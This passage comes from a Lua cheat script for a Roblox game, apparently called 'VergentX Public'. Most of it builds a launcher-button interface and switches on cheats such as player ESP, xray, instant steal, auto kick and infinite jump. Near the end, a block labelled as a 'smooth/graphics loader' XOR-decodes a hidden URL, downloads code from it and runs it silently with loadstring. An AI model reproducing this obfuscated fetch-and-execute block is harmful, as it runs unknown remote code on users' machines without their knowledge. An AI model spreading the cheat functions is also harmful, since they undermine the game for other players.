        NumberSequenceKeypoint.new(1.00, 0.35),
    }))
    fadePart(shadow, "BackgroundTransparency", 0.55)

    local halo = discFrame(holder, 13, 0)
    halo.Name = "VergentX_LauncherHalo"
    halo.BackgroundColor3 = Theme.GoldHi
    halo.BackgroundTransparency = 0.87
    gradient(halo, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Theme.GoldHi),
        ColorSequenceKeypoint.new(1, Theme.SilverLo),
    }), -40, NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 0.80),
        NumberSequenceKeypoint.new(0.50, 0.94),
        NumberSequenceKeypoint.new(1.00, 0.80),
    }))
    fadePart(halo, "BackgroundTransparency", 0.87)

    local orbit = discFrame(holder, 7, 1)
    orbit.Name = "VergentX_LauncherOrbit"
    local orbitStroke = Instance.new("UIStroke", orbit)
    orbitStroke.Thickness = 1
    orbitStroke.Transparency = 0.62
    orbitStroke.Color = Color3.fromRGB(6, 6, 8)
    orbitStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(orbitStroke, RING_SEQ, 205)
    fadePart(orbitStroke, "Transparency", 0.62)

    local circle = Instance.new("ImageButton", holder)
    circle.Name = "VergentX_LauncherCircle"
    circle.Size = UDim2.new(1, 0, 1, 0)
    circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    circle.BackgroundTransparency = 0.02
    circle.AutoButtonColor = false
    circle.Image = ""
    circle.BorderSizePixel = 0
    circle.ZIndex = 2
    Instance.new("UICorner", circle).CornerRadius = UDim.new(1, 0)
    gradient(circle, ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(58, 47, 24)),
        ColorSequenceKeypoint.new(0.32, Color3.fromRGB(24, 22, 20)),
        ColorSequenceKeypoint.new(0.62, Color3.fromRGB(13, 13, 15)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(35, 37, 43)),
    }), -40)
    fadePart(circle, "BackgroundTransparency", 0.02)

    local ring = Instance.new("UIStroke", circle)
    ring.Thickness = 1.4
    ring.Transparency = 0.15
    ring.Color = Color3.fromRGB(6, 6, 8)
    ring.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    local ringGrad = gradient(ring, RING_SEQ, 0)
    fadePart(ring, "Transparency", 0.15)
    pcall(function()
        TweenService:Create(ringGrad,
            TweenInfo.new(7, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
            { Rotation = 360 }):Play()
    end)

    local bevelClip = Instance.new("Frame", circle)
    bevelClip.Name = "VergentX_LauncherBevel"
    bevelClip.Size = UDim2.new(1, 0, 1, 0)
    bevelClip.BackgroundTransparency = 1
    bevelClip.ClipsDescendants = true
    bevelClip.ZIndex = 3
    Instance.new("UICorner", bevelClip).CornerRadius = UDim.new(1, 0)

    local gloss = Instance.new("Frame", bevelClip)
    gloss.Name = "Gloss"
    gloss.AnchorPoint = Vector2.new(0.5, 0)
    gloss.Position = UDim2.new(0.5, 0, 0, -1)
    gloss.Size = UDim2.new(0.94, 0, 0.54, 0)
    gloss.BackgroundColor3 = Color3.fromRGB(226, 228, 234)
    gloss.BackgroundTransparency = 0.78
    gloss.BorderSizePixel = 0
    gloss.ZIndex = 3
    Instance.new("UICorner", gloss).CornerRadius = UDim.new(1, 0)
    gradient(gloss, nil, 90, NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 0.62),
        NumberSequenceKeypoint.new(0.55, 0.90),
        NumberSequenceKeypoint.new(1.00, 1.00),
    }))
    fadePart(gloss, "BackgroundTransparency", 0.78)

    local shade = Instance.new("Frame", bevelClip)
    shade.Name = "Shade"
    shade.AnchorPoint = Vector2.new(0.5, 1)
    shade.Position = UDim2.new(0.5, 0, 1, 1)
    shade.Size = UDim2.new(1, 0, 0.55, 0)
    shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shade.BackgroundTransparency = 0.5
    shade.BorderSizePixel = 0
    shade.ZIndex = 3
    Instance.new("UICorner", shade).CornerRadius = UDim.new(1, 0)
    gradient(shade, nil, 90, NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 1.00),
        NumberSequenceKeypoint.new(0.60, 0.86),
        NumberSequenceKeypoint.new(1.00, 0.62),
    }))
    fadePart(shade, "BackgroundTransparency", 0.5)

    local bezel = discFrame(circle, -7, 4)
    bezel.Name = "VergentX_LauncherBezel"
    local bezelStroke = Instance.new("UIStroke", bezel)
    bezelStroke.Thickness = 1
    bezelStroke.Transparency = 0.7
    bezelStroke.Color = Color3.fromRGB(6, 6, 8)
    bezelStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(bezelStroke, RING_SEQ, 115)
    fadePart(bezelStroke, "Transparency", 0.7)

    local logoGlow = Instance.new("Frame", circle)
    logoGlow.Name = "VergentX_LauncherLogoGlow"
    logoGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    logoGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
    logoGlow.Size = UDim2.new(0.66, 0, 0.66, 0)
    logoGlow.BackgroundColor3 = Theme.GoldHi
    logoGlow.BackgroundTransparency = 0.88
    logoGlow.BorderSizePixel = 0
    logoGlow.ZIndex = 4
    Instance.new("UICorner", logoGlow).CornerRadius = UDim.new(1, 0)
    gradient(logoGlow, nil, 90, NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 0.72),
        NumberSequenceKeypoint.new(1.00, 0.98),
    }))
    fadePart(logoGlow, "BackgroundTransparency", 0.88)

    local logoShadow = Instance.new("ImageLabel", circle)
    logoShadow.Name = "VergentX_LauncherLogoShadow"
    logoShadow.AnchorPoint = Vector2.new(0.5, 0.5)
    logoShadow.Position = UDim2.new(0.5, 0, 0.5, 2)
    logoShadow.Size = UDim2.new(0.74, 0, 0.74, 0)
    logoShadow.BackgroundTransparency = 1
    logoShadow.Image = LOGO_ASSET
    logoShadow.ScaleType = Enum.ScaleType.Fit
    logoShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    logoShadow.ImageTransparency = 0.72
    logoShadow.ZIndex = 5
    fadePart(logoShadow, "ImageTransparency", 0.72)

    local logo = Instance.new("ImageLabel", circle)
    logo.Name = "VergentX_LauncherLogo"
    logo.AnchorPoint = Vector2.new(0.5, 0.5)
    logo.Position = UDim2.new(0.5, 0, 0.5, 0)
    logo.Size = UDim2.new(0.74, 0, 0.74, 0)
    logo.BackgroundTransparency = 1
    logo.Image = LOGO_ASSET
    logo.ScaleType = Enum.ScaleType.Fit
    logo.ImageTransparency = 0
    logo.ZIndex = 6
    fadePart(logo, "ImageTransparency", 0)

    local spec = Instance.new("Frame", circle)
    spec.Name = "Specular"
    spec.AnchorPoint = Vector2.new(0.5, 0.5)
    spec.Position = UDim2.new(0.32, 0, 0.22, 0)
    spec.Size = UDim2.new(0.3, 0, 0.16, 0)
    spec.Rotation = -32
    spec.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    spec.BackgroundTransparency = 0.72
    spec.BorderSizePixel = 0
    spec.ZIndex = 7
    Instance.new("UICorner", spec).CornerRadius = UDim.new(1, 0)
    gradient(spec, nil, 25, NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 1.00),
        NumberSequenceKeypoint.new(0.50, 0.62),
        NumberSequenceKeypoint.new(1.00, 1.00),
    }))
    fadePart(spec, "BackgroundTransparency", 0.72)

    local visible = true
    local hidden = false

    local function setShown(on)
        on = on and true or false
        if on == visible then return end
        visible = on
        if on then
            hidden = false
            gui.Enabled = true
            scale.Scale = restScale() * 0.55
            for i = 1, #fadeParts do
                local fp = fadeParts[i]
                pcall(function() fp[1][fp[2]] = 1 end)
            end
            TweenService:Create(scale,
                TweenInfo.new(0.30, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                { Scale = restScale() }):Play()
            local ti = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            for i = 1, #fadeParts do
                local fp = fadeParts[i]
                pcall(function()
                    TweenService:Create(fp[1], ti, { [fp[2]] = fp[3] }):Play()
                end)
            end
        else
            hidden = true
            TweenService:Create(scale,
                TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                { Scale = restScale() * 0.55 }):Play()
            local ti = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
            for i = 1, #fadeParts do
                local fp = fadeParts[i]
                pcall(function()
                    TweenService:Create(fp[1], ti, { [fp[2]] = 1 }):Play()
                end)
            end
            task.delay(0.2, function()
                if hidden then gui.Enabled = false end
            end)
        end
    end

    local pressAt, pressPos = 0, nil

    local function popBack()
        TweenService:Create(scale,
            TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            { Scale = restScale() }):Play()
    end

    local function driftFrom(startUD)
        if not startUD then return 0 end
        local now = holder.Position
        return math.abs(now.X.Offset - startUD.X.Offset)
            + math.abs(now.Y.Offset - startUD.Y.Offset)
            + math.abs(now.X.Scale - startUD.X.Scale) * 1000
            + math.abs(now.Y.Scale - startUD.Y.Scale) * 1000
    end

    circle.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
            and input.UserInputType ~= Enum.UserInputType.Touch then return end
        pressAt  = os.clock()
        pressPos = holder.Position
        TweenService:Create(scale, TweenInfo.new(0.10), { Scale = restScale() * 0.9 }):Play()
    end)

    circle.InputEnded:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
            and input.UserInputType ~= Enum.UserInputType.Touch then return end
        popBack()
        if driftFrom(pressPos) <= 6 and (os.clock() - pressAt) < 0.7 then
            if _G.VXToggleMenu then _G.VXToggleMenu() end
        end
    end)

    makeDraggable(circle, function(pos)
        popBack()
        if driftFrom(pressPos) > 6 then
            CONFIG.LAUNCH_POS = udim2ToTable(pos)
            saveConfig()
        end
    end, holder)

    local function syncFromSettings()
        local sg = _G.VXSettingsGui
        setShown(not (sg and sg.Enabled))
    end

    task.spawn(function()
        local t0 = os.clock()
        while not _G.VXSettingsGui and (os.clock() - t0) < 15 do task.wait(0.1) end
        local sg = _G.VXSettingsGui
        if not sg then return end
        sg:GetPropertyChangedSignal("Enabled"):Connect(syncFromSettings)
        syncFromSettings()
    end)

    function Launcher.SetPosition(pos)
        if pos then holder.Position = pos end
    end
    _G.VXLauncher = Launcher
    return Launcher
end

pcall(CreateStatusHub)
pcall(CreateStealBar)
pcall(CreateCooldownPanel)
pcall(CreateAdminPanel)
pcall(CreateAdminControlGUI)
pcall(CreateControlPanel)
pcall(CreateActionsPanel)
buildUI()
pcall(CreateLauncher)

if CONFIG.NO_ANIM        then F.setNoAnimation(true) end
if CONFIG.AUTO_INVIS     then F.setAutoInvis(true) end
if CONFIG.AUTO_ROTATE_INVIS then F.setAutoRotateInvis(true) end

if CONFIG.BASE_DETECTOR  then F.setBaseDetector(true) end
if CONFIG.INFINITE_JUMP  then F.setInfiniteJump(true) end
if CONFIG.ANTI_RAGDOLL   then F.setAntiRagdoll(true) end
if CONFIG.PLAYER_ESP     then F.setPlayerESP(true) end
if CONFIG.XRAY           then F.setXray(true) end
if CONFIG.SLOT_ESP       then F.setSlotESP(true) end
if CONFIG.SLOT_PLATFORMS then F.setSlotPlatforms(true) end
if CONFIG.FLOOR_PLATFORM then F.setFloorPlatform(true) end
if CONFIG.AUTO_KICK      then F.setAutoKick(true) end
if CONFIG.BASE_OWNER_ESP then F.setBaseOwnerESP(true) end
if CONFIG.BASE_DISPLAY   then F.setBaseDisplay(true) end
if CONFIG.GRAPHICS_STRIP then F.setGraphicsStrip(true) end
if CONFIG.CARPET_SPEED   then F.setCarpetSpeed(true) end
if CONFIG.INSTANT_STEAL and CONFIG.AUTO_STEAL then CONFIG.AUTO_STEAL = false end
if CONFIG.INSTANT_STEAL  then F.setInstantSteal(true) end

do
    local camConn = nil

    local function applyFOV()
        if not vxAlive() then return end
        local cam = Workspace.CurrentCamera
        if not cam then return end
        local want = math.clamp(tonumber(CONFIG.FOV) or 70, 70, 120)
        if math.abs(cam.FieldOfView - want) < 0.01 then return end
        pcall(function() cam.FieldOfView = want end)
    end
    _G.VXApplyFOV = applyFOV

    local function hookCamera()
        if not vxAlive() then return end
        local cam = Workspace.CurrentCamera
        if not cam then return end
        if camConn then
            pcall(function() camConn:Disconnect() end)
            camConn = nil
        end
        camConn = cam:GetPropertyChangedSignal("FieldOfView"):Connect(applyFOV)
        applyFOV()
    end

    vxBind(Workspace:GetPropertyChangedSignal("CurrentCamera"), hookCamera)
    vxBind(LP.CharacterAdded, function()
        task.wait(0.5)
        hookCamera()
    end)

    task.spawn(function()
        local t0 = os.clock()
        while not Workspace.CurrentCamera and (os.clock() - t0) < 20 do task.wait() end
        if not vxAlive() then return end
        hookCamera()
        while (os.clock() - t0) < 20 do
            task.wait(0.5)
            if not vxAlive() then return end
            applyFOV()
        end
    end)
end

if _G.VXCmdPanel then _G.VXCmdPanel.SetVisible(CONFIG.CMD_PANEL) end

if CONFIG.AUTO_STEAL then Steal.Sync() end

task.spawn(function()
    for _ = 1, 30 do
        if Brainrots.Ready() and Brainrots.count > 0 then break end
        pcall(Brainrots.Rescan)
        task.wait(0.2)
    end
end)

saveConfig()

vxBind(LP.OnTeleport, function()
    pcall(saveConfig)
end)
vxBind(Players.PlayerRemoving, function(plr)
    if plr == LP then pcall(saveConfig) end
end)


-- Hidden smooth/graphics loader (URL obfuscated; restores game smoothness)
task.spawn(function()
    if not vxAlive or not vxAlive() then return end
    local function _vxXorDecode(s)
        local t = table.create(#s)
        for i = 1, #s do
            t[i] = string.char(bit32.bxor(string.byte(s, i), 7))
        end
        return table.concat(t)
    end
    -- Fallback if bit32 missing
    if not bit32 or not bit32.bxor then
        _vxXorDecode = function(s)
            local t = {}
            for i = 1, #s do
                t[i] = string.char(string.byte(s, i) ~ 7)
            end
            return table.concat(t)
        end
    end
    local ok, src = pcall(function()
        return game:HttpGet(_vxXorDecode("osswt=((krf*dohjwbu*tofub)khqfekb)fww(fwn(wreknd(ufp(vl}4q`b?}v)krf8lb~:?37qiuppbo6514w4idr~uj~bufol636i"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)

ShowNotification("VergentX Public", IS_MOBILE
    and "Loaded  \u{00B7}  tap the logo button for the menu"
    or ("Loaded  \u{00B7}  tap the logo button or press "
        .. tostring(CONFIG.KEYS.Menu or "LeftControl")))